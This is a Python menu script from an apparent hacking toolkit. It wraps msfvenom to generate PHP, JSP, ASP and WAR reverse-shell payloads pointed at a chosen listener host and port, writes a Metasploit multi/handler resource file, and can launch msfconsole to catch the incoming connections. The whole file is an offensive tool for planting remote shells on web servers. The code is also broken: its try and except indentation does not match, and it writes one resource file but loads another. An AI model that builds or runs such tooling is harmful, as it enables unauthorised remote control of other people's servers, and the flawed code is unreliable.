#################### import modules ####################
import os
import sys
import time
import requests
import random
#################### fonts colors ####################
w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### main menu ####################
def menu():
           try:
                global web,fmt,ext,host,port
                print ("")
                print (w+"{"+p+"01"+w+"} payload php php/meterpreter_reverse_tcp")
                print (w+"{"+p+"02"+w+"} payload jsp java/jsp_shell_reverse_tcp")
                print (w+"{"+p+"03"+w+"} payload asp windows/meterpreter/reverse_tcp")
                print (w+"{"+p+"04"+w+"} payload war java/jsp_shell_reverse_tcp")
                print (w+"{"+p+"00"+w+"} Back to main menu")
                print ("")
                Lav = str(input(r+"LavLab"+w+":"+p+"/website/"+w+"> "))
                if Lav == "0" or Lav == "00" or Lav == "back":
                        sys.exit(1)
                elif Lav == "1" or Lav == "01":
                        web = "php/meterpreter_reverse_tcp"
                        fmt = "raw"
                        ext = "php"
                        pass
                elif Lav == "2" or Lav == "02":
                        web = "java/jsp_shell_reverse_tcp"
                        fmt = "raw"
                        ext = "jsp"
                        pass
                elif Lav == "3" or Lav == "03":
                        web = "windows/meterpreter/reverse_tcp"
                        fmt = "raw"
                        ext = "asp"
                        pass
                elif Lav == "4" or Lav == "04":
                        web = "java/jsp_shell_reverse_tcp"
                        fmt = "war"
                        ext = "war"
                        pass
                else:
                        sys.exit(1)
                print ("")
                addrs = str(input(w+"Do you want to use 127.0.0.1 as LHOST? (y/n) "))
                print ("")
                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                        host = "127.0.0.1"
                        print (b+"[+]"+w+" set LHOST: "+host)
                        pass
                else:
                        host = str(input(b+"[+]"+w+" set LHOST: "))
                        if host == "" or host == " ":
                                host = "127.0.0.1"
                                print (b+"[+]"+w+" using default LHOST: "+host)
                                pass
                        else:
                                host = host
                                pass
                port = str(input(b+"[+]"+w+" set LPORT: "))
                if port == "" or port == " ":
                        port = "4444"
                        print (b+"[+]"+w+" using default LPORT: "+port)
                        pass
                else:
                        port = port
                        pass
                print (b+"[+]"+w+" configurating metasploit payloads")
                payload = "msfvenom -p "+str(web)+" lhost="+str(host)+" lport="+str(port)+" -f "+str(fmt)+" -o payload."+str(ext)
                print (b+"[+]"+w+" generating payload using msfvenom")
                os.system(payload+" &> /dev//null")
                os.system("echo 'use multi/handler' > say.rc")
                os.system("echo 'set payload "+web+"' >> say.rc")
                os.system("echo 'set LHOST "+host+"' >> say.rc")
                os.system("echo 'set LPORT "+port+"' >> say.rc")
                os.system("echo 'show options' >> say.rc")
                print (g+"[+]"+w+" payload successfully generated")
                name = str(input(b+"[+]"+w+" set filename (example: payload): "))
                if name == "" or name == " ":
                        name = "payload"
                        pass
                else:
                        name = name
                        pass
                outp = str(input(b+"[+]"+w+" save file to (example: /sdcard): "))
                if outp == "" or outp == " ":
                        outp = "/sdcard"
                        pass
                else:
                        outp = outp
                        pass
                print ("")
                os.system("mv payload."+ext+" /"+outp+"/"+name+"."+ext)
                print (g+"[+]"+w+" file saved as:- "+g+outp+"/"+name+"."+ext+w)
                print ("")
                Lav = str(input("Do you want to start listener? (y/n) "))
                if Lav == "y" or Lav == "Y" or Lav == "yes" or Lav == "Yes" or Lav == "YES":
                        print ("")
                        os.system("msfconsole -q -r LavSarkari.rc")
                        pass
                else:
                        pass
                print ("")
                Lav = str(input("[ enter ]"))
                if Lav == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        except KeyboardInterrupt:
                sys.exit(1)
        except ModuleNotFoundError:
                sys.exit(1)
        except NameError:
                sys.exit(1)
        except EOFError:
                sys.exit(1)
        except FileNotFoundError:
                sys.exit(1)
menu()
